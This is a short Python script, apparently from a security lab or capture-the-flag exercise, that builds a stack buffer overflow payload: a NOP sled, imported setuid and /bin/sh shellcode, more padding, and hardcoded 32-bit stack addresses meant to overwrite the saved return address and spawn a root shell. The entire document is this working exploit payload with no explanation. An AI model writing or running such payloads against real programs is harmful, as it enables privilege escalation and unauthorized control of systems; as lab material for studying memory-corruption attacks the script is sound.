from shellcode import * 
she=setuid+bin_sh
nop='\x90'

p= '\xfc\xb5\xff\xbf' # bfffbd0c :: ebp+4
a= '\xe8\xad\xff\xbf' 

shell = nop*27+ she  + nop*1968 + a + p 
print(shell)
